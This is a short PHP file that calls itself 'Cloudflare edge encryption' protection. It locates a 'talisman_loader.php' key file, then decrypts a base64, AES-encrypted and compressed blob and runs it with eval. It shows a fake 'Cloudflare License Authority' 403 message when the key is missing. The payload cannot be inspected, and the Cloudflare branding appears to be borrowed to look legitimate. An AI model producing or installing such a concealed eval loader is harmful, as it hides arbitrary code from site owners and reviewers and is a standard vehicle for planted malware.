<?php
/* PROTECTED BY TALISMAN CLOUDFLARE EDGE ENCRYPTION v3.0 */
if(!function_exists('_talisman_runtime_key')){
  $l9246f=__DIR__;
  while($l9246f&&!file_exists($l9246f.'/talisman_loader.php')){
    $p=dirname($l9246f);if($p===$l9246f)break;$l9246f=$p;
  }
  if(file_exists($l9246f.'/talisman_loader.php')){require_once $l9246f.'/talisman_loader.php';}
}
$k80312=function_exists('_talisman_runtime_key')?_talisman_runtime_key():false;
if($k80312===false){header('HTTP/1.1 403 Forbidden');die('403 Security Error: Execution Locked by Cloudflare License Authority.');}
$pc2808=base64_decode('AM7DF4h4bQ7EL/0+9fPQtWlhQ0lFampBeEh5MmFVSmwwMEVXZStIY0ltMVRwNVVDTzg0bzUxYVpyOFljcm5UdjAzc2FrUlVHZmp5eXIwTk5sY1FDWkxRTFVuYXN0TkdBT1lDKzZVRzZwZXVWS3JZRjFDVnBnemttenRweWVMUmpjeFhKUFY3Qk96d01ZbSt5UWdRT01pZVg4ZjE0K2Z6bm9VM0Y5dTROMXpJeDJ0WUVxRFR3d3pBaXhqa3gwRUhSeGtuM2tUTlRhQnRxeHlkR1hMUzNGdUV4WGR2M2NUSDc2NklmdGxxQ2drb0cxc0RJaVI4eVNSeTUrZFg0SWJiUm1paVROMG8vaGhnVlNmdFpzVmJ2RS94bkVOUjl3aEFheFVCbDVPa2NTREFmRGRWOFRaMDUyNlRBaXl4SENoUjl0Y1FyeWlld3VaMjRvYm9kQ0FKSEQzeTVzSk5qZWpXZmp5Q1VWM0d0b2VtUGhzR1I1UzRReVJUc0hMTHhrdHN2RFloZkJsSlcwWDcxSG1IT3FCV2JGM2p3YUxiYlpRMks5OUp6OXRYaTY2MktES3Nwa05Vb3l4SWJHRTJLVkxtRlMvb0RObURVR2NMYUtuaEZkQkk2YjdDOUNwUS9JWDhaZVNIbEd4bnljbkR2K0NVMnpjYzJIM2kyUEsrTWg5UmJtb3pQNkM2UVBtTURyNkl2K3FFVVoyQ3ZDRUE2cGhDRUVKU1g0aCtDcWRrYm5jYWo3S3B4VVJ2MWVxTlFqTEpiZWFlaHQ2NkZHRTZMOHlRSkR4OS92TXFhZUJ6ZHdicFdIOExYc1JCOU5LMEViZE05V2hYazZQbjRHbmNtN3NKbGtocmo0QVBuRjFPT21ISVZBd2svMFFPQzJoeUk1UjBXeksybTRRPT0=');
$ifd4ec=openssl_cipher_iv_length('aes-256-cbc');
$vdc7b9=substr($pc2808,0,$ifd4ec);
$ceacb5=substr($pc2808,$ifd4ec);
eval('?>'.gzinflate(openssl_decrypt($ceacb5,'aes-256-cbc',$k80312,0,$vdc7b9)));